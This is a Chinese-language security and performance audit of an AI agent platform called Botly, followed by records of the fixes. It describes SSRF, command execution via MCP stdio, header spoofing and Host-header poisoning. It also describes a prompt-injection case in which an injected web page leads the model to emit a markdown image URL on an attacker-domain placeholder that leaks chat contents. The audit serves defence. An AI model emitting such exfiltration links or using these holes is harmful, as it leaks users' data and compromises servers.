# Botly 代码审查与优化建议

审查日期:2026-11-03 · 对象:Botly-main.zip(server + web 源码)· 依据:仅阅读代码与配置文件,未参考 README 和 docs

## 一、总体结论

Botly 的功能完整度很高:后端有 60 多个测试文件,有 Alembic 迁移、压测和备份脚本,Worker 有租约恢复、幂等和审批流程。主要问题集中在三类:

- 多用户场景下的安全收口(SSRF、命令执行、IP 伪造、数据外带)。
- Worker 的并发模型和流式输出的数据库写入方式,会在用户变多后成为瓶颈。
- 迁移体系、代码体量和工程化(CI、依赖锁定、容器权限)。

## 二、审查范围与局限

已读:`core/security.py`、`core/deps.py`、`core/db.py`、`core/events.py`、`core/redis_bus.py`、`core/models.py`(索引部分)、`api/auth.py`、`api/files.py`、`api/uploads.py`、`api/stream.py`、`api/mcp.py`、`api/providers.py`、`sandbox/files.py`、`tools/mcp.py`、`tools/registry.py`(网页读取部分)、`worker.py`、`agent/orchestrator.py`(结构、流式写入、模型轮)、`agent/llm.py`(超时与重试)、`docker-compose.yml`、`deploy/nginx.conf`、`server/Dockerfile`、`web` 的 `middleware.ts`、`next.config.ts`、`Markdown.tsx`、SSE 相关代码。

未细读:`orchestrator.py` 的大部分业务逻辑、`api/chats.py`、`sandbox/cube.py`、技能安装、MCP 的 HTTP 传输细节、大部分前端页面。

标注「推断」的条目没有实际状态验证,建议实测后再动手。

## 三、问题总览

| 编号 | 问题 | 级别 | 位置 |
| --- | --- | --- | --- |
| S1 | 模型厂商 base\_url 无 SSRF 防护 | 高 | api/providers.py |
| S2 | MCP stdio 任意命令,且继承全部环境变量 | 高 | tools/mcp.py、api/mcp.py |
| S3 | 客户端 IP 可伪造,绕过登录限流(推断) | 高 | deploy/nginx.conf、auth.py、deps.py |
| S4 | 重置密码链接可被 Host 头投毒 | 高 | api/auth.py |
| S5 | Markdown 外链图片可外带聊天内容,且无 CSP | 中高 | Markdown.tsx、next.config.ts |
| S6 | 默认密钥与弱口令不拦截 | 中 | core/config.py、.env.example、compose |
| P1 | Worker 事件循环被同步数据库调用阻塞 | 高 | agent/orchestrator.py、worker.py |
| P2 | 流式输出写放大 | 高 | orchestrator.py 的 \_write\_delta |
| P3 | events 表缺复合索引,SSE 每秒轮询 | 中高 | core/models.py、api/stream.py |
| P4 | 一个聊天页开 3 条 SSE | 中 | app/chat/page.tsx、SidePanel.tsx |
| P5 | 执行租约没有归属,可能双跑 | 中 | worker.py |
| P6 | 其他同步阻塞与连接池未配置 | 中 | registry.py、core/db.py |
| D1 | 迁移体系三套并存,每次启动都改表 | 中高 | core/db.py |
| D2 | 消息 seq 索引非唯一 | 低 | core/models.py |
| E1 | 工程化缺口(CI、依赖锁、容器权限等) | 中 | 仓库根目录、Dockerfile |
| E2 | 代码体量过大 | 中 | orchestrator.py、前端页面 |
| E3 | 小项汇总 | 低 | 多处 |

## 四、安全问题

### S1 模型厂商 base\_url 没有 SSRF 防护

现象:`tools/registry.py` 的 `web_read` 有完整的内网拦截(`_check_url`),但 `api/providers.py` 保存厂商、探测模型、检测能力时,对用户填写的 `base_url` 没有任何校验。

风险:任何登录用户都可以填 `http://redis:6379`、`http://db:5432`、`http://api:8000` 或云元数据地址,让服务器代为发起请求,探测失败时的报错信息还会回显给用户。

建议:

- 保存、更新、探测、实际调用四个入口统一走同一个校验函数,复用 `_check_url` 的逻辑。
- 自建本地模型(Ollama 等)确实需要访问内网,加一个部署级开关,例如 `BOTLY_ALLOW_PRIVATE_BASE_URL=1`,默认关闭,或维护一份域名白名单。
- 报错信息不要原样回显对端响应内容。

### S2 MCP stdio 传输等于让用户在服务器上执行命令

现象:`api/mcp.py` 的 `_validate_transport` 对 stdio 只检查命令非空;`tools/mcp.py` 的 `_spawn_stdio` 直接 `create_subprocess_exec`,且 `full_env = dict(os.environ)`,子进程拿到整个进程的环境变量。

风险:任何登录用户都能在 API 或 Worker 所在机器上执行任意命令,并读到 `BOTLY_SECRET_KEY`、数据库密码、Redis 密码、SMTP 密码。多用户部署下这是最严重的一项。

建议:

- 默认关闭 stdio,新增 `BOTLY_MCP_STDIO_ENABLED`,开启后只允许管理员(`BOTLY_ADMIN_EMAILS`)创建。
- 命令加白名单(如 `npx`、`uvx`、`python` 的指定参数),拒绝 shell 元字符和绝对路径之外的任意程序。
- 子进程使用干净的环境:只传 `PATH`、`HOME` 和用户为该服务配置的 `env`,不要继承 `os.environ`。
- 更稳妥的做法是让 stdio 进程跑在沙箱容器里,而不是宿主机。

### S3 客户端 IP 可伪造,登录限流可被绕过(推断)

现象:

- `deploy/nginx.conf` 使用 `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`,这个变量会把客户端自带的 XFF 保留并追加真实地址。
- `docker-compose.yml` 设置了 `FORWARDED_ALLOW_IPS: "*"`。
- `auth.py` 和 `deps.py` 各有一份 `_ip()`,都取 XFF 最左值。登录限流用的是 `request.client.host`,按 uvicorn 信任全部代理时的行为,它同样取最左值。

风险:攻击者每次请求带不同的 `X-Forwarded-For`,按 IP 的限流就失效,可以对大量邮箱做撞库。按邮箱的限流仍在,但它也能被用来锁死别人的账号。

建议:

- nginx 改为覆盖:`proxy_set_header X-Forwarded-For $remote_addr;`。
- `FORWARDED_ALLOW_IPS` 只写 nginx 所在网段,不要用 `*`。
- 把两份 `_ip()` 合并成 `core/deps.py` 里的一个函数,全站统一使用(登录限流、邮件令牌、日志)。
- 注册和找回密码接口同样加按 IP 限流。

### S4 重置密码链接可被 Host 头投毒

现象:`auth.py` 的 `_base_url()` 在未配置 `BOTLY_BASE_URL` 时,用请求的 `X-Forwarded-Host` 或 `Host` 拼邮件里的链接。

风险:攻击者对受害者邮箱发起找回密码,同时伪造 Host 头,受害者收到的邮件里的重置链接会指向攻击者的域名,点击后令牌泄露。

建议:非开发模式下强制要求配置 `BOTLY_BASE_URL`,未配置就拒绝发送认证邮件;开发模式才允许从请求头推导。

### S5 Markdown 外链图片可外带聊天内容

现象:`Markdown.tsx` 使用 react-markdown 默认渲染,没有覆盖 `img`;`next.config.ts`、`middleware.ts`、nginx 都没有设置 CSP。

风险:Agent 会读取网页(`web_read`)。网页里的提示注入可以让模型输出 `![](https://攻击者域名/?q=聊天里的敏感内容)`,浏览器渲染时自动请求该地址,数据就被带出去了,用户全程无感。

建议:

```tsx
const components: Components = {
  img({ src, alt }) {
    // 只允许同源图片;其余渲染成纯文本链接,需要用户主动点击
    if (typeof src === "string" && src.startsWith("/api/")) {
      return <img src={src} alt={alt ?? ""} loading="lazy" />;
    }
    return <span className="text-muted">[外部图片已拦截:{alt}]</span>;
  },
  // ...原有的 a、table
};
```

同时在 `next.config.ts` 的 `headers()` 或 nginx 里加响应头:`Content-Security-Policy: default-src 'self'; img-src 'self' data:; frame-ancestors 'none'`,并补上 `X-Content-Type-Options`、`Referrer-Policy`。

### S6 默认密钥与弱口令不拦截

现象:

- `core/config.py` 中 `BOTLY_SECRET_KEY` 缺省为 `dev-insecure-secret-key-please-change`,API Key 的加密主密钥又是从它派生的。docker-compose 会强制要求设置,但走 `start.sh` 时不会拦。
- `.env.example` 里 Redis 密码是 `123456`;compose 里 Postgres 和 Redis 默认密码都是 `botly`。

建议:

- 非开发模式(例如 `BOTLY_ENV=production`)下,密钥为默认值就拒绝启动。
- 单独设置 `BOTLY_ENCRYPTION_KEY`,不要和会话签名共用同一个源密钥。
- compose 里的数据库和 Redis 密码改成必填,不给默认值。

## 五、性能与稳定性

### P1 Worker 事件循环被同步数据库调用阻塞

现象:`orchestrator.py` 里 grep 到约 36 处 `session_scope()` / `SessionLocal()` 等同步调用,直接写在 `async def` 里,而 `to_thread` / `run_in_executor` 一处都没有。`worker.py` 的 `_claim`、`_recover_and_collect`、`_wake_waiting_parents`、`check_alerts` 也是在事件循环里同步执行。另外 `redis_bus.publish_event` 用的是同步 Redis 客户端,超时 3 秒。

风险:一个 Worker 进程同时跑最多 20 个执行,共用一个事件循环。任何一次数据库往返变慢、锁等待、Redis 抖动,都会让所有执行的流式输出和心跳一起停顿。

建议(由易到难):

1. 把 Redis `publish` 换成异步客户端,或放进 `asyncio.to_thread`。
2. Worker 里每 5 秒一次的调度扫描(`_recover_and_collect` 等)整体放进 `asyncio.to_thread`。
3. 执行路径上的写库(`_write_delta`、`_finalize_message`、`add_message`)用 `await asyncio.to_thread(...)` 包一层,或迁移到 SQLAlchemy 异步引擎。
4. 同时给数据库连接池配置足够的容量,见 P6。

### P2 流式输出的写放大

现象:`_write_delta` 约每 100ms 触发一次,每次做的事:查 `Message`、查 `Thread`、把完整累计文本写回 `msg.content`、再插入一条 `message.delta` 事件,而事件的 payload 里是完整累计文本,不是增量。子任务还要给主线程镜像再来一遍,每次都要提交事务。

风险:一条 10000 字的回复,写入量是平方级增长;events 表快速膨胀(保留 7 天),SSE 推送的数据量也同样膨胀。20 个并发执行时,数据库写入压力会很明显。

建议:

- 事件只带增量(`delta` 字段)和序号;前端按序号拼接,丢事件时用快照兜底。
- 增量事件可以走 Redis 临时广播,不入 events 表;只有创建、完成、中断这类关键事件落库。
- `Message.content` 的落库降到 1–2 秒一次,结束时再写一次完整内容。
- `_write_delta` 里缓存 `chat_id`,不要每次都查 `Thread`。

### P3 events 表缺复合索引,SSE 每秒轮询

现象:

- SSE 的查询是 `WHERE user_id=? AND id>? AND chat_id=? ORDER BY id`,但表上只有 `user_id`、`chat_id` 两个单列索引。
- `Waker.wait(timeout=1.0)` 返回后,不管有没有收到唤醒,循环都会再查一次库。所以每个 SSE 连接至少每秒一次查询。

建议:

```python
# core/models.py
class Event(Base):
    __table_args__ = (Index("ix_events_user_chat_id", "user_id", "chat_id", "id"),)
```

并把 `_stream` 改成:只在收到唤醒时查库,另加一个 5–10 秒的兜底查询。

### P4 一个聊天页同时开 3 条 SSE

现象:`app/chat/page.tsx`(约 389 行)订阅 `/api/chats/{id}/events`,`SidePanel.tsx`(约 398 行)又订阅一次同一个地址,`page.tsx` 约 556 行还有通知流。重连固定 1.5 秒,没有退避。

风险:HTTP/1.1 下浏览器对同一域名最多 6 个并发连接。打开两个标签页就占满,之后普通 fetch 请求会排队卡住。服务端每多一条连接,就多一份轮询压力(见 P3)。

建议:

- 聊天页只保留一条事件流,通过 React Context 分发给侧边栏。
- 多标签页用 `BroadcastChannel` 或 `SharedWorker` 共享同一条连接。
- 部署上 HTTPS + HTTP/2,多路复用后连接数限制基本不再是问题。
- 重连加指数退避和随机抖动,并在 `online` 事件时立即重连。

### P5 执行租约没有归属,可能同一个执行被跑两遍

现象:`worker.py` 的 `_claim` 只设置 `status=running` 和 `lease_until`,没有记录是哪个 Worker 认领的;`_heartbeat` 里的异常被 `except Exception: pass` 吞掉。

风险:Worker 因 GC 停顿、数据库抖动而没能续租,租约过期后另一个 Worker 接手;原来的 Worker 恢复后继续执行,同一个 run 被两个进程同时推进,工具副作用可能重复(代码里有按 call id 去重,但不能覆盖所有情况)。

建议:认领时写入 `worker_id` 和递增的 `lease_token`;每次写消息、写工具结果、提交状态前校验 token 仍然属于自己;续租失败连续几次就主动中止本地执行。

### P6 其他同步阻塞与连接池

- `tools/registry.py` 的 `_check_url` 在 async 的 `_web_read` 里同步调用 `socket.getaddrinfo`,且每次重定向都会再调一次,DNS 慢时会卡住事件循环。改成 `await loop.getaddrinfo(...)`。
- `core/db.py` 的 `create_engine` 没有配置 `pool_size` 和 `max_overflow`,默认 5+10;而 Worker 并发是 20,再加 API 和 SSE。建议做成环境变量,并按「Worker 并发 + API 并发」估算。
- Worker 收到 SIGTERM 后 `asyncio.gather(*running.values())` 没有超时,容器 10 秒后会被强杀;建议设置优雅退出超时,超时则把未结束的执行放回队列。
- `_recover_and_collect` 每次只取前 50 条 queued,如果队首有大量因「每用户并发上限」被跳过的执行,后面的用户会被饿死。

## 六、数据库与迁移

### D1 迁移体系三套并存,每次启动都改表

现象:`core/db.py` 的 `init_db()` 依次执行 `create_all`、`_light_migrate`(硬编码的加列字典)、`_ensure_alembic`、`_upgrade_alembic`、`_backfill_thread_seq`、`_migrate_bot_name_uniqueness`、`_ensure_message_search_index`。API 和 Worker 都会各执行一遍。

问题:

- `_light_migrate` 与 Alembic 的版本脚本在加列上重复,哪边是准的并不清楚。
- `_migrate_bot_name_uniqueness` 每次启动都执行 `ALTER TABLE bots DROP CONSTRAINT IF EXISTS ...` 和 `CREATE UNIQUE INDEX IF NOT EXISTS ...`,`ALTER TABLE` 需要表级强锁,且这一步没有 advisory lock,API 和 Worker 同时启动可能互相等待。
- `_ensure_alembic` 遇到老库会直接 `stamp head`,等于假定旧库已经是最新结构。
- 多处 `except Exception: pass`,迁移失败会被静默吞掉,应用带着不完整的表结构继续状态。

建议:

- 把 `_light_migrate`、唯一索引改造、搜索索引、seq 回填全部改写成 Alembic 版本脚本。
- 应用启动时只检查「当前版本是否等于 head」,不一致就拒绝启动并提示;迁移作为部署流程里单独的一步执行(compose 里加一个一次性的 `migrate` 服务)。
- 生产环境不要再调用 `create_all`。
- 迁移相关的异常不要吞,至少记 ERROR 日志。

### D2 消息 seq 索引不是唯一的

`Message` 上的 `ix_msg_thread_seq` 是普通索引。seq 由 `threads.seq_counter` 原子分配,正常不会重复,但一旦出现并发 bug 或手工修数据,就会产生重号且没有任何报错。建议改成 `UniqueConstraint("thread_id", "seq")`。

## 七、工程质量

### E1 工程化缺口

- 没有 `.github/`,没有 CI。建议至少跑:`pytest`、`tsc --noEmit`、`npm test`、`pip-audit`、`npm audit`。
- 没有 LICENSE 文件。
- `requirements.txt` 全是 `>=`,没有锁文件;建议用 `pip-tools` 或 `uv` 生成 lock,Docker 构建按 lock 安装。
- `server/Dockerfile` 和 `web/Dockerfile` 都以 root 状态,没有 `HEALTHCHECK`;建议加非 root 用户和健康检查,compose 里 `depends_on` 改用 `condition: service_healthy`。
- nginx 只监听 80,没有 TLS、HSTS 和安全响应头;`BOTLY_COOKIE_SECURE` 需要手动开,建议当 `BOTLY_BASE_URL` 是 https 时默认开启。
- Docker 沙箱(`sandbox/linux.py`)的 `docker run` 没有 `--cap-drop ALL`、`--security-opt no-new-privileges`,也没有限制网络;如果只用于本机测试,请在配置说明里写清楚。
- `package.json` 有 `lint: next lint`,但没有安装 eslint,也没有 eslint 配置,这个脚本跑不起来。
- 端口不一致:`main.py` 的 CORS 只放行 3100,而实际是 3200(本地)和 3000(容器)。同源部署下不影响,但配置是过期的。

### E2 代码体量过大

- `agent/orchestrator.py` 3696 行,一个 `RunExecutor` 类约 70 个方法,涵盖模型轮、委派、并行批次、审批、摘要、记忆、收尾。建议拆成:`model_turn`、`delegation`、`approvals`、`summary_memory`、`finish`、`prompts` 几个模块,类只保留状态机。
- 前端 `settings/page.tsx` 1822 行(44 个 `useState`),`chat/page.tsx` 1436 行(32 个 `useState`)。建议按功能区拆组件,把相关状态收进自定义 hook 或 `useReducer`。
- 前端测试只有 2 个文件,后端有 60 多个,聊天流和 SSE 同步逻辑值得补测试。

### E3 小项汇总

- 注册接口没有限流,先查邮箱是否存在、后查邀请码,可以被用来枚举邮箱和暴力猜邀请码;错误提示统一、并加限流。
- 登录对不存在的账号会跳过 `verify_password`,响应时间比存在的账号短,可以做时序枚举;可以对不存在的账号也跑一次假的 bcrypt 校验。
- 会话 Cookie 无状态,退出登录不会让旧 Cookie 失效(只有改密码会递增 `session_epoch`)。如果需要「退出即失效」,在退出时也递增 epoch,或加服务端会话表。
- `sandbox/files.py` 的 `quota_used` 在每次写文件时用 `os.walk` 遍历整个用户目录,文件多了会明显变慢,可以维护一个累计计数。
- `api/uploads.py` 先 `await file.read()` 把整个文件读进内存,再判断是否超过 2 MB;改成分块读取并超限即中断。
- `_web_read` 的 SSRF 校验与实际连接之间仍有 DNS 重绑定的窗口:解析一次后按 IP 连接,并带上 Host 头。
- `_check_url` 对域名只拦 `is_private`、回环和链路本地,没有拦 `is_reserved` 和组播,与 IP 字面量的判定口径不一致。

## 八、建议的修复顺序

第一批(安全,尽快):

1. S2:MCP stdio 默认关闭或仅限管理员,并清理环境变量。
2. S1:厂商 base\_url 加 SSRF 校验。
3. S3 + S4:修 nginx 的 XFF 与强制配置 `BOTLY_BASE_URL`。
4. S5:外链图片拦截和 CSP。
5. S6:默认密钥与弱口令检查。

第二批(性能,用户量上来之前):

1. P3:events 加复合索引,SSE 不再每秒空查。
2. P2:流式输出改为增量事件、降低落库频率。
3. P1:Redis publish 与调度扫描挪出事件循环,再逐步处理写库路径。
4. P4:前端合并 SSE 连接。
5. P5:租约加 owner 与 token。

第三批(工程化):

1. D1:迁移全部收敛到 Alembic。
2. E1:补 CI、依赖锁、非 root 容器、HTTPS 配置。
3. E2:拆分 orchestrator 和大页面,补前端测试。

每一项建议在改动后用现有的压测脚本(`scripts/loadtest.py`)和 `verify_multiuser.py` 回归一次,尤其是 P1、P2、P3 这三项,改完应该能看到数据库 QPS 和 p95 延迟的变化。

## 九、2026-11-04 高危修复记录

本次按「高」及「中高」条目修复，并核对工作区已有改动。上文保留为 2026-11-03 的审查原文，下表记录当前实现。

| 编号 | 当前实现与验证 |
| --- | --- |
| S1 | 保存、更新、刷新、能力探测、实际请求共用地址校验。默认拒绝内网、元数据、非 HTTP 服务及无效地址；请求连接固定到已校验的 IP，保留 Host/SNI，不跟随重定向、不继承环境代理。错误响应正文不向用户回显。旧接入也在调用前重新检查。 |
| S2 | stdio 默认禁用；创建、导入、修改、重新检测及状态均限制管理员。启用后还必须匹配部署配置的完整命令参数白名单，命令使用绝对路径，禁止 shell 元字符。子进程只获得 PATH、HOME 和服务显式配置的 env。 |
| S3 | nginx 覆盖 XFF，容器只信任固定代理地址；应用与日志统一使用经过 ASGI 代理校验的客户端地址，不再读取原始 XFF。登录、注册、找回密码及发送验证邮件均有按 IP 限流。已验证连续修改 XFF 不能绕过限流。 |
| S4 | 非开发环境必须配置有效的 BOTLY_BASE_URL 才能生成认证链接，开发链接也只在开发/测试环境返回。已验证伪造 Host / X-Forwarded-Host 不会改变重置链接。 |
| S5 | Markdown 图片仅自动加载鉴权的上传/文件接口，拒绝外部图片、路径穿越及认证重定向地址。Next 与 nginx 提供 CSP 和安全响应头，直接访问开发服务也有防护。 |
| P1 | Worker 调度、Agent 的准备/消息写入/用量/摘要/收尾，以及文件、记忆、终端数据库事务移到后台线程；Redis 可用性探测及发布不阻塞事件循环。数据库连接池容量可配置。慢工具执行期间的其他协程仍能推进。 |
| P2 | 增量事件只携带 delta 与 Unicode 字符偏移量，草稿正文约每 1.5 秒落库，结束时写入完整内容。快照补齐尚未落库的增量；聊天页与任务详情按偏移去重，缺片段时重新取快照。保留持久事件以支持断线重放。100 段、共 10,000 字的测试只产生 9,900 字增量，不重复累计正文，正文和元数据在同一次 UPDATE 中写入。 |
| P3 | 事件表增加 user_id / chat_id / id 复合索引；SSE 查询移到后台线程，只在唤醒或 10 秒兜底到期时查库，15 秒心跳按实际经过时间计算。 |
| D1 | 初始表结构冻结在 Alembic 基线，兼容补列、序号回填及索引改造由 revision 管理；迁移在同一锁内串行执行。生产启动只检查版本，不建表、不改表、不 stamp head。pg_trgm 权限失败使用保存点回滚并记录日志。新库、旧库补列、并发迁移和生产只读启动均有回归覆盖。 |

回归还修复了分支复制历史后未更新 seq_counter 的问题，防止新消息与复制消息的唯一序号冲突。

部署时使用 `BOTLY_ENV=production`，配置 `BOTLY_BASE_URL`、会话密钥、独立加密密钥及数据库/Redis 密码；API 与 Worker 启动前在 server 目录执行 `./venv/bin/python -m app.migrate`。已有的生产密钥检查继续保留。stdio 默认无需配置；仅可信部署需要启用时设置 `BOTLY_MCP_STDIO_ENABLED=1`、`BOTLY_ADMIN_EMAILS` 和 `BOTLY_MCP_STDIO_ALLOWED_COMMANDS`，例如完整 argv 列表 `[["/usr/local/bin/node", "/opt/mcp/server.js"]]`。

50 用户独立 Postgres 验收：50/50 执行完成，并发峰值 20，350 项隔离检查通过；200 请求的消息接口 p95 为 85.0ms，群聊列表 p95 为 119.4ms。使用离线 mock 模型和本机环境，此结果用于回归容量与隔离，不代表真实模型/远端沙箱的吞吐。

生产构建与开发服务的缓存目录已隔离（`.next` / `.next-dev`），防止构建校验覆盖状态中的 CSS。修复后生产构建通过，聊天页布局及 CSS 200 响应均已检查。

第一轮验证：后端 `pytest` 全量 384 项通过；前端 `npm test` 41 项通过，类型检查与生产构建通过。50 用户验收通过；`git diff --check` 无异常。

## 十、2026-11-04 收尾与终端资源修复

| 项目 | 收尾结果 |
| --- | --- |
| 终端分块 404 | xterm 和 FitAddon 随聊天页打包，仍在浏览器打开终端时执行，不再请求独立的旧 xterm 分块。开发与生产缓存保持隔离，dev.sh 不再删除生产构建目录。已经打开的旧页面需要刷新以加载新资源。 |
| PostgreSQL SSE 提交顺序 | 事件先加入当前事务的待提交队列；业务写入完成后，在提交阶段按用户持有事务锁并分配事件 ID。避免较小 ID 晚提交后被客户端游标跳过。回滚和关闭事务会丢弃尚未提交的事件。 |
| P4 | 同页面各订阅者持有独立监听器，连接由 SharedWorker 跨标签页复用；包含近期事件补发、指数退避、online 重连及失联页面清理。通知按账号隔离。浏览器不支持 SharedWorker 时回退为同页面共享连接。 |
| P6 | 执行、邮件与终端任务共用 Worker 退出预算；本机启动器保留清理时间，API 设置退出超时，容器 Worker 增加停止宽限时间。 |
| E1 | 移除 .github 忽略项，CI 文件可正常纳入版本控制；CI 增加独立 PostgreSQL 并发事件回归。补充服务端 Docker 上下文过滤、前端 public 资源复制与健康检查。未执行完整 Docker 部署。 |
| E2 | 编排入口从 3434 行拆到约 670 行；派发、任务交接、工具、上下文和收尾职责拆入独立模块。聊天事件与通知抽成 hook，空状态组件及设置页弹窗、字段组件独立。保留现有调用入口和状态机行为。 |

本轮在用户要求停止测试之前，已有后端 389 项、前端 45 项通过，类型检查与生产构建通过；PostgreSQL 并发提交回归包含在内。追加的独立 50 用户验收也已完成：50/50 执行完成，峰值 20，350 项隔离检查通过。用户要求不再状态测试后停止追加验证。

本机业务库已备份到 `server/data/backups/backup-20261104-055125-570373.dump`，迁移检查结果为 `0011`。API、Worker、Web 已于 2026-11-04 重启加载修复，启动器 PID 记录在 `/private/tmp/botly-finish-runtime.json`。代码仍位于当前工作区，未发布到远端。
